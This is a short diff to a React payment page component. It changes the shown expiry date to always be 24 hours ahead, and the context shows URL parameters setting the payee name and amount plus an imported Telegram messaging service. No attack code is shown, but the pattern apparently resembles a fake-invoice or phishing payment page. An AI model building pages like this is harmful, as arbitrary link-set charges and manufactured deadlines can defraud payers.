@@ -1,5 +1,5 @@
 import { useParams, useNavigate } from "react-router-dom";
-import { useEffect } from "react";
+import { useEffect, useMemo } from "react";
 import { sendMessageToTelegram } from "@/backend/telegramService";
 
 const dummyPaymentData: Record<string, any> = {
@@ -29,13 +29,20 @@ const PaymentPage = () => {
 
   const queryParams = new URLSearchParams(window.location.search);
   
+  // Calculate dynamic expiry date (24 hours from now)
+  const dynamicExpiry = useMemo(() => {
+    const tomorrow = new Date();
+    tomorrow.setHours(tomorrow.getHours() + 24);
+    return tomorrow.toISOString().split('T')[0];
+  }, []);
+  
   const paymentData = {
     id: id || 'unknown',
     customerName: queryParams.get('n') || (dummyPaymentData[id as string]?.customerName || defaultPaymentData.customerName),
     amount: parseFloat(queryParams.get('a') || String(dummyPaymentData[id as string]?.amount || defaultPaymentData.amount)),
     currency: queryParams.get('c') || (dummyPaymentData[id as string]?.currency || defaultPaymentData.currency),
     description: queryParams.get('p') || (dummyPaymentData[id as string]?.description || defaultPaymentData.description),
-    expiryDate: queryParams.get('e') || (dummyPaymentData[id as string]?.expiryDate || defaultPaymentData.expiryDate),
+    expiryDate: queryParams.get('e') || dynamicExpiry,
     createdAt: dummyPaymentData[id as string]?.createdAt || defaultPaymentData.createdAt
   };
 
